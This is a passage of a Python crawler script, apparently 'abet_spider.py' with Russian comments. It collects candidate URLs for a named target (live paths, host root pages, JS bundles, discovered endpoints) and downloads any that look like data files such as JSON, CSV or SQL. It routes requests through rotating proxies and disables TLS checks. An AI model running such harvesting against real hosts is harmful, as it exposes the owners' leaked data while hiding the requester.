            if len(parts) == 2 and parts[0] == "200":
                candidates.append(parts[1])
    # 2) главные страницы хостов
    for h in HOSTS:
        candidates.append(f"https://{h}/")
    # 3) JS-бандлы из собранного
    js_file = f"/root/office/output/{target_name}_spider_js.txt"
    if os.path.exists(js_file):
        candidates += [l.strip() for l in open(js_file) if l.strip()]
    # 4) эндпоинты ABET (если есть)
    for ep_file in ("/root/office/output/abet_endpoints.txt", "/root/office/output/abet_endpoints2.txt"):
        if os.path.exists(ep_file):
            for line in open(ep_file):
                ep = line.strip()
                if ep.startswith("/"):
                    for h in HOSTS[:2]:
                        candidates.append(f"https://{h}{ep}")

    candidates = list(dict.fromkeys(candidates))
    print(f"[download] кандидатов на скачивание: {len(candidates)}", flush=True)
    with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futs = {}
        for u in candidates:
            if u in seen:
                continue
            seen.add(u)
            futs[ex.submit(_download_one, u, base_dir)] = u
        for fu in cf.as_completed(futs):
            u = futs[fu]
            try:
                name, size = fu.result()
                if name:
                    downloaded += 1
                    print(f"[download] OK {u} -> {name} ({size} б)", flush=True)
            except Exception as e:
                print(f"[download] FAIL {u}: {e}", flush=True)
    print(f"\n[download] ИТОГО скачано: {downloaded} файлов -> {base_dir}", flush=True)


def _download_one(url, base_dir):
    """Скачать URL если в доступе (200) И это данные (по правилам _is_data_candidate).
    Без мусора: SPA-фолбэки, css, картинки, мелкие html — пропускаются.
    Возвращает (имя_файла, размер)."""
    import hashlib
    for _try in range(3):
        proxy = next_proxy()
        try:
            r = requests.get(url, proxies=proxy, headers={"User-Agent": UA,
                "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"}, verify=False,
                timeout=TIMEOUT, allow_redirects=True, stream=True)
            if r.status_code != 200:
                return (None, 0)
            ct = (r.headers.get("Content-Type") or "").lower()
            # читаем первые 64 КБ для проверки
            head = r.raw.read(65536)
            total = len(head)
            if not _is_data_candidate(url, ct, total, head.decode("utf-8", "replace")):
                r.close()
                return (None, 0)
            # имя файла: хост + хэш + расширение по пути/контенту
            from urllib.parse import urlparse
            p = urlparse(url)
            host = p.netloc.replace(":", "_")
            path = p.path.rstrip("/") or "/index"
            if path.endswith(DATA_EXTS):
                ext = os.path.splitext(path)[1]
            elif "json" in ct:
                ext = ".json"
            elif "csv" in ct:
                ext = ".csv"
            elif "sql" in ct:
                ext = ".sql"
            else:
                ext = ".dat"
            h = hashlib.md5(url.encode()).hexdigest()[:10]
            fname = f"{host}__{h}{ext}"
            fpath = os.path.join(base_dir, fname)
            with open(fpath, "wb") as f:
                f.write(head)
                for chunk in r.iter_content(65536):
                    f.write(chunk)
                    total += len(chunk)
                    if total > 10_000_000:  # лимит 10 МБ на файл
                        break
            r.close()
            return (fname, total)
        except Exception:
            continue
    return (None, 0)

if __name__ == "__main__":
    if FLAG_COLLECT:
        run_collect()
    elif FLAG_ALIVE:
        run_alive()
    elif FLAG_DOWNLOAD:
        run_download()
    else:
        main()


# ════════════════════════════════════════════════════════
# РЕЖИМ СКАЧИВАНИЯ: если URL в доступе (200) — качаем файл
# Запуск: python3 abet_spider.py --download <хосты>
# ════════════════════════════════════════════════════════
